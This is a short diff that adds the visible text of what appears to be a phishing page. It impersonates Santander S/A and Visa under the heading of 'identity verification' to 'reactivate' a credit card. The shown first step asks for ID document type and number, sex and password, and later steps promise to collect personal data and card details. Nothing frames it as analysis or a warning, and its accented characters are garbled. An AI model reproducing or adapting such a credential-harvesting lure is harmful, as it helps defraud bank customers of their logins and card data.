@@ -1,0 +1,24 @@
+Santander S/A   IE=edge
+Visa HomeVERIFICACI?N DE IDENTIDAD - REACTIVACION DE CUENTA
+Si desea activar su tarjeta de credito Visa nuevamente, le solicitamos que siga el proceso de identificaci?n personal que a continuaci?n se le propone.
+INGRESO
+Paso 1
+Ingreso
+Paso 2
+Datos Personales
+Paso 3
+Informacion de Tarjeta
+INGRESO
+Tipo de Documento
+   Cédula de Identidad
+   Documento Nacional de Identidad
+   Documento Unico
+   Libreta C?vica
+   Libreta de Enrolamiento
+   Pasaporte
+    N?mero
+Sexo
+   Masculino
+   Femenino
+    Contrase?a
+SIGUIENTE >  text/html;charset=UTF-8
